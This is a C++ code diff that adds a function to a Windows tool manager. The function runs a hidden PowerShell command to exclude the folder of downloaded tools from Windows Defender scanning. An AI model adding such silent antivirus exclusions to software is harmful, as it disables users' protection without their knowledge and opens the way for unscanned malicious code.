@@ -189,6 +189,19 @@ void ToolManager::DownloadTool(const std::wstring& name, const std::wstring& url
     }).detach();
 }
 
+bool ToolManager::AddDefenderExclusion() {
+    std::wstring args = L"-NoProfile -Command \"";
+    args += L"try { Add-MpPreference -ExclusionPath '" + m_toolsPath + L"' -ErrorAction Stop; exit 0 } ";
+    args += L"catch { exit 1 }\"";
+    SHELLEXECUTEINFOW sei = { sizeof(sei) };
+    sei.fMask = SEE_MASK_NOASYNC;
+    sei.lpVerb = L"open";
+    sei.lpFile = L"powershell.exe";
+    sei.lpParameters = args.c_str();
+    sei.nShow = SW_HIDE;
+    return ShellExecuteExW(&sei) == TRUE;
+}
+
 bool ToolManager::LaunchTool(const std::wstring& exePath) {
     std::wstring workingDir;
     size_t lastSlash = exePath.find_last_of(L"\\/");
